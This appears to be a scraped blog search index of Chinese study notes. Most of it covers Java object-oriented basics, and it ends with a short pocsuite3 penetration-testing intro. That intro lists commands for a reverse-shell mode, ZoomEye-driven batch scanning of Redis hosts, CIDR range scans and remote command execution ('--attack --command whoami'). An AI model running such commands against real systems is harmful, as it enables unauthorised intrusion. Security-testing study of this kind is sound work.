","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:15","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"包装类 单元测试 步骤如下： package cn.xpshuai.java3; import org.junit.Test; /* * Java中JUnit单元测试 * * 步骤： * 1.选中当前工程–右键选择: build path - add libraries - JUnit 4 -下一步 * 2.创建Java类，进行单元测试 * 测试的Java类要求： * 1.此类是public的 * 2.此类提供公共是无参数的构造器 * 3.此类中声明单元测试方法： * 此时的单元测试方法：方法权限为public，没有返回值类型。没有形参 * 4.此单元测试方法需要声明注解：@Test, 并import org.junit.Test; * * 5.声明好单元测试方法后，就可以在方法中写相关测试代码 * 6.写完代码后，双击方法名：右键--\u003eRun As --\u003e JUnit Test * * 说明： * 1.如果执行结果没有任何异常:绿条 * 2.... 异常：红条 * * */ public class JUnitTest { int num = 10; @Test public void testEquals() { String s1 = new String(\"y\"); String s2 = new String(\"yyy\"); System.out.println(s1 == s2); System.out.println(s1.equals(s2)); System.out.println(num); // 可以直接调用属性和方法 } @Test public void testToString() { System.out.println(num); } } 包装类(Wrapper)的使用 让基本数据类型也具有类的特征，封装起来 基本类型、包装类、String三种类型相互转换： package cn.xpshuai.java3; /* * * * */ import org.junit.Test; public class WrapperTest { public static void main(String[] args) { } // 1.基本数据类型转换为包装类：调用包装类的构造器 @Test public void test1() { int num1 = 10; Integer in1 = new Integer(num1); System.out.println(in1.toString()); Integer in2 = new Integer(\"132\"); System.out.println(in2.toString()); Float float1 = new Float(\"11.1\"); System.out.println(float1); Boolean boolean1 = new Boolean(\"tRuE\"); Boolean boolean2 = new Boolean(\"true123\"); System.out.println(boolean1); // true System.out.println(boolean2); // false 比较特别 System.out.println(boolean2); // false 比较特别 Order order = new Order(); System.out.println(order.isMan); // null System.out.println(order.isFemale); // false } // 2.包装类转换为基本数据类型：调用包装类的xxxValue() @Test public void test2() { Integer in1 = new Integer(12); // 对象 int i1 = in1.intValue(); // 变成基本变量了 System.out.println(i1 + 11); } // JDK5.0新特性：自动装箱与拆箱，用不着（.基本数据类型转换为包装类：调用包装类的构造器） @Test public void test3() { int num1 = 10; // 基本数据类型--\u003e包装类的对象 // method1(num1); // 新特性：自动装箱 int num2 = 11; //自动装箱 Integer in2 = num2; boolean isFlag = true; //自动装箱 Boolean isFlag2 = isFlag; // 新特性：自动拆箱（包装类转换为基本数据类型） int num3 = in2; // 自动拆箱 } public void method1(Object obj) { System.out.println(obj); } // 3.基本数据类型、包装类 --\u003e转换为String类型 @Test public void test4() { // 方式1：连接运算 int num1 = 10; String str1= num1 + \"\"; //方式2：调用String重载的valueof(xxx xxx) float f2 = 12.3f; String string = String.valueOf(f2); System.out.println(string); // \"12.3\" Double d1 = new Double(12.5); String string2 = String.valueOf(d1); System.out.println(string2); } // 3.String类型 --\u003e转换为基本数据类型、包装类：调用包装类的parseXXX方法 @Test public void test5() { String str1 = \"123\"; //记住 int num2 = Integer.parseInt(str1); System.out.println(num2); //123 } } class Order{ Boolean isMan; boolean isFemale; } Vector()可以代替数组，后续再说… ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:16","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"关键字：static 无论产生了多少个对象，只希望某些特定的数据在内存空间中只有一份 static可以用来修饰：属性、方法、代码块、内部类 **static修饰属性：**静态变量 属性按照是够使用static修饰分为：静态属性 vs 非静态属性(实例变量) 实例变量：创建的多个对象，每个对象都独立拥有一套类中的非静态属性。当修改其中一个非静态属性时不会影响另一个对象中相同属性值的修改 静态属性：创建了类的多个对象，公用同一个静态变量，当通过某一个对象修改该静态变量时，会导致其他对象调用该静态变量时是修改过的 * * (1)静态变量随着类的加载而加载: \"类.静态变量\"方式进行调用 * (2)静态变量的加载要早于对象的创建 * (3)由于类只会记载一次，则静态变量在内存中也会只存在一份：存在方法区的静态域 * 举例：System.out Math.PI static修饰方法： 静态方法随着类的加载而加载: \"类.静态方法\"方式进行调用 静态方法中，只能调用静态的方法或属性 非静态方法中，既可以调用非静态的方法或属性，也可以调用静态的方法或属性 在静态的方法内，不能使用this关键字、super关键字 关于静态属性和静态方法的使用，大家都从生命周期的角度去理解。 /* * 在开发中，如何确定一个属性是否需要声明为static： * \u003e属性是可以被多个对象所共享的，不会随着对象的不同而本同的。 * 在开发中，如何确定一个方法是否需要声明为static： * \u003e操作静态属性的方法，通常设置为static的 * \u003e工具类中的方法，习惯上声明为static的,比如 Math, Collection, Arrats */ public class StaticClass { public static void main(String[] args) { Chinese.nation = \"CHN\"; Chinese c1 = new Chinese(); c1.name = \"姚明\"; c1.age = 40; // c1.nation = \"CHN\"; Chinese c2 = new Chinese(); c2.name = \"马龙\"; c2.age = 30; System.out.println(c2.nation); // 直接 \"类.方法\" 调用 Chinese.show(); } } class Chinese{ String name; int age; static String nation; public static void show() { System.out.println(\"我是一个中国人！！！\"); Chinese.nation =\"CHN\"; // Name = \"YYY\"; } public void show2() { System.out.println(\"我是一个中国人2！！！\"); Chinese.nation =\"CHN\"; System.out.println(this.name); } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:17","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"类变量和实例变量内存解析 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:18","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"单例模式 package cn.xpshuai.java4; /* * 单例(SingleTon)设计模式： * 1.定义：某个类只能存在一个实例 * 2.如何实现 * 饿汉式单例模式 vs 懒汉式单例模式 * * 3.区分饿汉式、懒汉式 * 饿汉式： 坏处：对象加载时间过长。 * 好处：是线程安全的 * 懒汉式：好处：延迟对象创建 * 目前下面的写法坏处：线程不安全 --\u003e多线程章节再修改 * * 4.单例模式优点：减少了系统的开销 * * 5.单例模式使用场景： * */ public class SingleTonTest { public static void main(String[] args) { // 饿汉式测试 // bank1和bank2是一个对象 Bank bank1 = Bank.getIntance(); Bank bank2 = Bank.getIntance(); System.out.println(bank1 == bank2); // 懒汉式测试 Order order1 = Order.getInstance(); Order order2 = Order.getInstance(); System.out.println(order1 == order2); } } // 【饿汉式单例模式】 class Bank{ // 1.私有化类的构造器：为了避免在外面类调用该构造器 private Bank() { } // 2.内部创建类的对象 // 4.要求此对象也必须是static的 private static Bank instance1 = new Bank(); //先创建 //3.提供公共静态方法，返回类的对象(类似getXXX方法) public static Bank getIntance() { return instance1; } } //【懒汉式单例模式】 class Order{ // 1.私有化类的构造器 private Order(){ } // 2.声明当前类对象（没有初始化） // 4.此对象也必须声明为static private static Order instance2 = null; // 3.声明public、static的返回当前类对象的方法 public static Order getInstance() { if(instance2 == null) { instance2 = new Order(); } return instance2; } } 一个.java源文件只能有一个public的类 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:19","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"代码块 package cn.xpshuai.java4; /* * 类成员4：代码块（或初始化块） * * 1.代码块作用：用来初始化类、对象 * 2.如果有修饰的话，只能用static来修饰 * 3.分类：静态代码块 vs 非静态代码块 * 静态代码块： * \u003e内部可以有输出语句 * \u003e随着类的加载而执行，且只执行一次 * \u003e作用：初始化类的信息 * \u003e如果一个类中定义多个静态代码块，按照声明优先顺序执行 * \u003e静态代码块要优先于非静态代码块的执行 * \u003e只能调用静态结构，不能调用非静态属性和方法 * * 非静态代码块： * \u003e内部可以有输出语句 * \u003e随着对象的创建而执行，每创建一个对象就执行一次非静态代码块 * \u003e作用：可以在创建对象时对对象的属性进行初始化 * \u003e如果一个类中定义多个非静态代码块，按照声明优先顺序执行 * \u003e可以调用非静态属性和方法以及静态属性和方法 * 非静态代码块执行顺序先于构造器 * * * 对属性可以赋值的位置：按顺序排 * 1.默认初始化 * 2.显式初始化 / 3.在代码块中赋值 * 4.构造器初始化 * 5.有对象之后，通过\"对象.属性\" 或 \"对象.方法\"方式进行赋值 * * * * 开发中使用代码块(使用频率不高)： * * * 由父及子，先静后构 * * */ public class BlockTest { public static void main(String[] args) { String desc = Person.desc; Person p1 = new Person(); System.out.println(desc); } } class Person{ //属性 String name; int age; static String desc = \"我是一个人\"; //构造器 public Person() { } public Person(String name, int age) { super(); this.name = name; this.age = age; } //非静态代码块代码块 { System.out.println(\"hello非静态代码块1\"); // 调用非静态结构 age = 1; // eat(); // 调用静态结构 info(); desc = \"hhhhhh\"; } { System.out.println(\"hello非静态代码块2\"); age = 1; // } //静态代码块 static{ System.out.println(\"hello静态代码块1\"); // 只能调用静态结构 info(); desc = \"重新赋值，我是一个爱学习的人1\"; } static{ System.out.println(\"hello静态代码块1\"); desc = \"重新赋值，我是一个爱学习的人2\"; } //方法 public void eat() { System.out.println(\"人吃饭\"); } @Override public String toString() { return \"Person [name=\" + name + \", age=\" + age + \"]\"; } public static void info() { System.out.println(\"我是一个快乐的人\"); } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:20","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"final 关键字 final可以修饰的结构：类、方法、变量 package cn.xpshuai.java4; /* *关键字：final * * final可以修饰的结构：类、方法、变量 * * 【final修饰类：】 * 该类加了final后，不能被继承了 * 比如：String, System, StringBuffer * * 【 final修饰方法：】 * 该方法不能被重写了 * 比如：Object中的getClass() * * 【 final修饰变量：】 * 此时的\"变量\"就称为是一个常量，不能再修改了 * final修饰属性：可以考虑赋值的位置有：显式初始化、代码块中初始化、构造器中初始化 * * 【 final修饰局部变量：】 * 方法内声明的局部变量、形参 * 尤其是final修饰形参时候，表示该形参为一个常量，当我们调用时候为这个形参赋值为一个实参，以后，方法内只能进行调用不能修改 * * * static final: 用来修饰 属性 --\u003e全局常量(接口中常用)、方法 --\u003e * * */ public class FinalTest { public static void main(String[] args) { AA aa = new AA(); aa.setDown(10); } } final class FinalA{ // 该类不能再被继承了 } class AA{ // 该属性不能再被修改了 final String NAME = \"aaa\"; final int WIDTH; final int HEIGHT; // final int DOWN; { WIDTH =10; } public AA(){ HEIGHT = 10; } public AA(int n){ HEIGHT = n; } public final void show() { //此方法不能被重写了 } public void setDown() { final int NUM = 11; // final之后就变成常量了 } public void setDown(final int num) { System.out.println(num); //修饰形参时候，方法内只能进行调用不能修改 } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:21","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"抽象类与抽象方法（重要） abstract 有时将一个父类设计得非常抽象，以至于它没有具体的实例，这样的类叫做抽象类。 package cn.xpshuai.java5; /* * abstract * 可以修饰的结构：类、方法 * abstract修饰，表示不能造对象了 * * abstract修饰类:抽象类 * \u003e此类不能实例化 * \u003e抽象类中一定有构造器，便于子类实例化时候调用 * \u003e开发中，都会提供抽象类的子类，让子类对象实例化并完成操作 * * * * abstract修饰方法:抽象方法 * \u003e只有方法的声明，没有方法体 * \u003e如果类中包含有抽象方法，那么该类一定是抽象类。反之抽象类中不一定要有抽象方法 * \u003e若子类重写了父类中所有抽象方法中，才能实例化对象 * 若子类没有重写父类中的所有的抽象方法，则此子类也是一个抽象类，需要使用abstract修饰 * * * 抽样的应用场景举例： * * * 注意点： * 1.abstract不能用来修饰：属性、构造器等 * 2.abstract不能用来修饰私有方法、静态方法、final的方法、final的类 * * */ public class AbstractTest { public static void main(String[] args) { // Person p1 = new Person(); // abstract之后就不能实例化对象了 // p1.eat(); } } abstract class Person { // abstract之后就不能实例化了 private String name; private int age; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public void eat() { System.out.println(\"人：吃饭\"); } public void walk() { System.out.println(\"人：走路\"); } abstract public void play(); //抽象方法（只有方法的声明，没有方法体）子类中必须得实现这个方法 } class Student extends Person{ public Student(String name, int age) { super(name, age); // } //F1.重写该方法 @Override public void play() { System.out.println(\"学生玩\"); } //F2:把子类变成抽象类 } 创建抽象类的匿名子类对象 package cn.xpshuai.java5; /* * 抽象类的匿名子类 */ public class PersonTest { public static void main(String[] args) { method(new Student(\"tom\", 19)); //匿名对象 Worker worker = new Worker(); method1(worker); //非匿名的类和对象 method1(new Worker()); //非匿名的类, 匿名的对象 //创建了一个匿名子类的对象：p Person p = new Person() { @Override //重写匿名方法即可 public void play() { System.out.println(\"匿名重写\"); } }; method1(p); //创建匿名子类的匿名对象（适合用一次的情况） method1(new Person() { @Override public void play() { System.out.println(\"玩好玩的东西\"); } }); } public static void method(Student s) { } public static void method1(Person p) { } } class Worker extends Person{ @Override public void play() { System.out.println(\"工人娱乐\"); } } **多态的应用：**模板方法设计模式 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:22","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"接口(Interface)（重要） package cn.xpshuai.java5; /* * 接口关键字的使用： * 1.使用Interface 关键字定义 * 类可以实现多个接口 * 一定程度解决了类的单继承的局限性 * 2.Java中，接口和类是并列的两个结构 * * 3.定义接口：定义接口中的成员 * 3.1 JDK7及以前：只能够定义全局常量和抽象方法 * \u003e全局常量：public static final的, 但是书写时可以省略不写 * \u003e抽象方法：public abstract的 * * * * * 3.2 JDK8: 除了定义全局常量和抽象方法之外，还可以定义：静态方法、默认方法 * * * * * * 4.接口中不能定义构造器！！！意味着接口不可以实例化 * * 5.开发中，接口通过类去\"实现\"(implements)的方式来使用 * 如果实现类覆盖了接口中所有抽象方法，则该实现类有实例化 * 如果实现类没有覆盖接口中所有的抽象方法，则此实现类仍为一个抽象类 * 抽象类和接口中，叫实现，不叫重写 * * * 6.Java类可以实现多个接口---\u003e弥补了Java单继承性的局限性问题 * 格式：class AA extends BB implements CC, DD{ } * * * 7.接口和接口之间：也叫继承，可以多继承 * * * 8.接口是具体使用，体现了多态性 * 9.接口，实际上可以看做是一种规范 * * 面试题：抽象类与接口有哪些异同？ * * * 接口应用：代理模式、工厂模式(一种设计模式) * */ public class InterfaceTest { public static void main(String[] args) { Plane plane = new Plane(); plane.fly(); } } interface AttackAble{ void attack(); } interface Flyable{ //全局常量 public static final int MAX_SPEED = 7900; int MIN_SPEED = 1; //省略了public static final // 抽象方法 public abstract void fly(); void stop(); // 省略了public abstract } class Plane implements Flyable{ @Override // 这叫：实现，不叫重写 public void fly() { System.out.println(\"飞机通过引擎起飞\"); }; @Override public void stop() { System.out.println(\"驾驶员减速停止\"); }; } //只能还叫抽象类，要么就把抽象方法都实现了 abstract class Kite implements Flyable{ @Override // 这叫：实现，不叫重写 public void fly() { System.out.println(\"风筝通过风起飞\"); }; } //子弹类（ 实现多个接口） class Bullet extends Object implements Flyable, AttackAble{ //先写继承父类，后写实现具体的接口 @Override public void attack() { } @Override public void fly() { } @Override public void stop() { } } interface AA{ void method1(); } interface BB{ void method2(); } interface CC extends BB,AA{ } package cn.xpshuai.java5; /*JDK8: 除了定义全局常量和抽象方法之外，还可以定义：静态方法、默认方法 * * * */ public class Java8Test { // public static void method1() { // System.out.println(\"北京\"); // } public static void main(String[] args) { SubClass sub = new SubClass(); //知识点1：接口中定义的静态方法，只能通过接口来调用 CompareA.method1(); //知识点2：通过实现类的对象，可以调用接口中默认方法，可重写 sub.method2(); //没有method1() //知识点3：如果子类(或实现类)继承的父类和实现接口中有声明了同名同参数的方法 // 子类在没有重写此方法的情况下，则调用的是父类中此方法 --\u003e 类优先原则 sub.method3(); //知识点4：如果实现类实现了多个接口，而这个接口中定义了同名参数的默认方法 //那么在实现类没有父类，且没有重写此方法的情况下，报错--\u003e接口冲突 // 这就需要我们必须实现此类中重写此方法 } } class SubClass extends SuperClas implements CompareA,CompareB{ @Override public void method2() { System.out.println(\"compareA:上海222222\"); } //知识点5：如何在子类(实现类)的方法中调用父类、接口中被重写的方法 public void myMethod() { method3(); //调自己的 super.method3(); //调父类的 //调接口中的默认方法 CompareA.super.method3(); CompareB.super.method3(); } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:23","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"内部类（用的少） 一种类成员 package cn.xpshuai.java5; /* * 类的内部成员之五: 内部类 * 1.Java中允许将一个类A声明在另一个类B中，则类A就是内部类，类B称为外部类 * 2.内部类分类： 成员内部类(静态、非静态) vs 局部内部类(方法内、代码块内、构造器内) * * 3.成员内部类： * 一方面，作为外部类的成员： * \u003e调用外部类的结构 * \u003e可以被static修饰 * \u003e可以被权限修饰符修饰 * * * 另一方面，作为一个类： * \u003e类内可以定义属性、方法、构造器 * \u003e可以被final修饰，表示此类不能被继承 * \u003e可被abstract修饰，表示不能被实例化 * * 4.1 如何实例化成员内部类对象？ * * 4.2 如何在成员内部类中区分调用外部类的结构？ * * 4.3 开发中，局部内部类的使用 * * * * */ public class InnerClassTest { public static void main(String[] args) { //创建Food实例(静态的成员内部类) People.Food food = new People.Food(); food.show(); //创建Food2实例(非静态的成员内部类) // People.Food2 food2 = new People.Food2(); People people = new People(); People.Food2 food2 = people.new Food2(\"大白菜\"); food2.show(); } } class People{ String name; int age; public void eat() { System.out.println(\"people eat\"); } // 静态成员内部类 static class Food{ // abstract String name; int age; public void show() { System.out.println(\"food1\"); } // eat(); } // 非静态成员内部类 class Food2{ String name; public Food2(String name) { this.name = name; } public void show() { System.out.println(name + \"food22\"); } // People.this.eat(); //调用外部类属性(非静态) public void display(String name) { System.out.println(name); // 形参 System.out.println(this.name); //内部类的属性 System.out.println(People.this.name); //外部类的属性 } } public void method() { //局部内部类 class AA{ } } { //局部内部类 class BB{ } } // 构造器 public People() { //局部内部类 class CC{ } } //返回一个实现了Comparable接口的类的对象 public Comparable getComparable() { //创建一个实现了Comparable接口的类：局部内部类 class MyComparable implements Comparable{ @Override public int compareTo(Object obj) { return 0; } } return new MyComparable(); } } 局部内部类使用注意点： public class Test{ public void method() { //局部内部类的方法中，如果调用局部内部类所声明的方法中的局部变量的话， //要求此局部变量声明为final //局部变量: jdk7之前需要加final，jdk8后可省略，但默认也是的 int num = 11; //局部内部类 class AA{ public void show() { //只能用，不能修改局部变量，其实是一个副本 // num = 22; //报错 System.out.println(num); } } } } 内容逻辑有些混乱，仅为个人学习笔记…… ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:24","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"数组 数组(Array)，是多个相同类型数据按一定顺序排列的集合，并使用一个名字命名，并通过编号的方式对这些数据进行统一管理。 数组本身就是引用数据类型，而数组中的元素可以是任何数据类型。 创建数组对象会在内存中开辟一整块连续的空间，而数组名中引用的是这块连续空间的首地址。 数组的长度一旦确定，就不能修改。 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%95%B0%E7%BB%84/:0:1","tags":["Java","数组"],"title":"Java学习之数组","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%95%B0%E7%BB%84/"},{"categories":["Java学习"],"content":"一维数组 使用 public class ArrayTest { public static void main(String[] args) { int[] ids; // 声明 ids = new int[] {1001, 1002, 1003, 1004, 1005, 1006}; //初始化方式1(静态初始化)：数组的初始化和数组元素的赋值操作同时进行 String[] names = new String[5]; //动态初始化：数组的初始化和数组元素的赋值操作分开进行 //一旦初始化完毕，数组长度就确定了 int[] ididids ={1001, 1002, 1003, 1004, 1005, 1006}; //类型推断(非标准写法) //错误写法... //int[] arr1 = new int[]; //int[5] arr1 = new int[]; //int[] arr1 = new int[3]{1,2,3}; //2.调用指定位置的元素: 通过索引[0,n-1] names[0] = \"张三\"; // 通过角标赋值 names[1] = \"陈奕迅\"; names[2] = \"朱一龙\"; names[3] = \"张杰\"; names[4] = \"伍佰\"; // charAt(0)，只要不是数据库交互，都是从0开始 System.out.print(names[1]); //3.如何获取数组长度: .length属性 System.out.print(names.length); System.out.println(ids.length); //4.如何遍历数组 for(int i=0; i \u003c names.length; i++) { //最大到长度-1 System.out.println(\"姓名：\" + names[i] + \"\\t学号：\" + ids[i]); } //5.数组元素的默认初始化值 // 若数组元素是整型：默认初始化值为0 // ...浮点型：0.0 // 若数组元素是char：默认初始化值为0 ,形式上为\"空格\" // ...布尔型：false // ... 引用数据类型时(比如String)：null int[] arr1 = new int[4]; for (int i = 0; i \u003c arr1.length; i++) { System.out.println(arr1[i]); } // 若数组元素是String：默认初始化值为null String[] arr2 = new String[4]; for (int i = 0; i \u003c arr2.length; i++) { System.out.println(arr2[i]); } //6.一维数组的内存解析 System.out.println(\"111\"); // } } 一维数组的内存解析 首先，在jvm中，内存的简化结构如下: 一维数组的内存解析如下： **引用计数算法：**当栈中没有变量指向堆空间的地址，就会自动回收这段堆中的垃圾地址 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%95%B0%E7%BB%84/:0:2","tags":["Java","数组"],"title":"Java学习之数组","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%95%B0%E7%BB%84/"},{"categories":["Java学习"],"content":"二维数组 对于二维数组，可以看做是一维数组又作为另一个一个数组的元素而存在。 其实，从数组底层的运行机制来看，并没有多维数组。 使用 public class DoubleArrayTest { public static void main(String[] args) { //* 1.声明和初始化 //二维 //静态初始化 int[][] arr2 = new int[][]{{1,2,3}, {4,5,6}, {7,8,9}}; // 动态初始化 String[][] arr22 = new String[3][2]; // 行列 String[][] arr222 = new String[3][]; String arr2222[][] = new String[3][4]; int[][] arr22222 ={{1,2,3}, {4,5,6}, {7,8,9}}; String[][] names = new String[4][2]; //错误情况： //String[][] arr22 = new String[][4]; //2.调用指定位置的元素 names[0][0] = \"张三\"; // 通过角标赋值 names[0][1] = \"陈奕迅\"; names[1][0] = \"朱一龙\"; names[1][1] = \"张杰\"; names[2][0] = \"伍佰\"; names[2][1] = \"迪丽热巴\"; names[3] = new String[2]; // //System.out.println(names[1][0]); for (int i = 0; i \u003c names.length; i++) { for (int j = 0; j \u003c names[i].length; j++) { System.out.print(names[i][j] + \"\\t\"); //未赋值的为null } System.out.println(); } //3.如何获取数组长度: .length属性 System.out.println(names.length); //获取的是外层数组的长度 System.out.println(names[0].length); // 获取的外层第一个元素的数组的长度 System.out.println(names[1].length); //4.如何遍历二维数组：两层（先遍历指定行再遍历列） for (int i = 0; i \u003c names.length; i++) { for (int j = 0; j \u003c names[i].length; j++) { System.out.print(names[i][j] + \"\\t\"); //未赋值的为null } System.out.println(); } //5.二位数组元素的默认初始化值 // 外层元素(是一个地址值)，内层元素(同一维) int[][] arrDouble = new int[4][3]; System.out.println(arrDouble); // 二维的地址值：[[I@15db9742 System.out.println(arrDouble[0]); //外层是一个地址值 [I@6d06d69c System.out.println(arrDouble[0][0]); // 是0 String[][] arrDoubleS = new String[4][3]; System.out.println(arrDoubleS[0]); //是一个地址值 System.out.println(arrDoubleS[0][0]); // 是null //6.二维数组的内存解析 } } 二维数组的内存解析 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%95%B0%E7%BB%84/:0:3","tags":["Java","数组"],"title":"Java学习之数组","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%95%B0%E7%BB%84/"},{"categories":["Java学习"],"content":"Arrays工具类 public class ArraysToolClassTest { public static void main(String[] args) { // boolean equals(int[] a,int[] b) int[] arr1 = new int[]{1,2,3}; int[] arr2 = new int[] {10,3,9}; boolean isEquals = Arrays.equals(arr1, arr2); System.out.println(isEquals); // String toString(int[] a) 输出数组信息 System.out.println(Arrays.toString(arr1)); // void fill(int[] a, int val) 将指定值填充到数组中 Arrays.fill(arr1, 9); System.out.println(Arrays.toString(arr1)); // void sort(int[] a) Arrays.sort(arr2); System.out.println(Arrays.toString(arr2)); // int binarySearch(int[] a, int key) 二分查找(前提：数组必须有序) int[] arr3 = new int[] {-98,-50,-3,0,3,6,99,210,999}; int index = Arrays.binarySearch(arr3, 210); //如果找到了返回的是索引，如果找不到就返回负数 System.out.println(index); } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%95%B0%E7%BB%84/:0:4","tags":["Java","数组"],"title":"Java学习之数组","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%95%B0%E7%BB%84/"},{"categories":["渗透测试"],"content":"简介 读读英文… pocsuite3 is an open-sourced remote vulnerability testing and proof-of-concept development framework developed by the Knownsec 404 Team. It comes with a powerful proof-of-concept engine, many powerful features for the ultimate penetration testers and security researchers Pocsuite有两种交互模式： 一个是命令行模式类似我们所知的sqlmap的界面 另一个是控制台交互模式类似w3af或者matasploit的界面。 ","date":"2021-01-11","objectID":"/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:0:1","tags":["开源渗透框架","pocsuite"],"title":"pocsuite简单学习","uri":"/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"安装 github地址：https://github.com/knownsec/Pocsuite3 也可通过pip安装：pip install pocsuite3 安装完成后测试是否安装成功： pocsuite -h # pip安装的情况 python cli.py -h # 适用于下载并解压zip压缩包的情况 ","date":"2021-01-11","objectID":"/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:0:2","tags":["开源渗透框架","pocsuite"],"title":"pocsuite简单学习","uri":"/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"基本使用 命令行模式下常用命令： pocsuite -u http://example.com -r example.py -v 2 # 基础用法 v2开启详细信息 pocsuite -u http://example.com -r example.py -v 2 --shell # shell反连模式，基础用法 v2开启详细信息 pocsuite -r redis.py --dork service:redis --threads 20 # 从zoomeye搜索redis目标批量检测，线程设置为20 pocsuite -u http://example.com --plugins poc_from_pocs,html_report # 加载poc目录下所有poc,并将结果保存为html pocsuite -f batch.txt --plugins poc_from_pocs,html_report # 从文件中加载目标，并使用poc目录下poc批量扫描 pocsuite -u 10.0.0.0/24 -r example.py --plugins target_from_cidr # 加载CIDR目标 pocsuite -u http://example.com -r ecshop_rce.py --attack --command \"whoami\" # ecshop poc中实现了自定义命令 verify和attack两种POC模式 在使用Pocsuite的时候，我们可以用–verify参数来调用_verify方法，用–attack参数来调用_attack方法。 # POC内部方法如下 def _attack(self): result = {} #Write your code here return self.parse_output(result) def _verify(self): result = {} #Write your code here return self.parse_output(result) 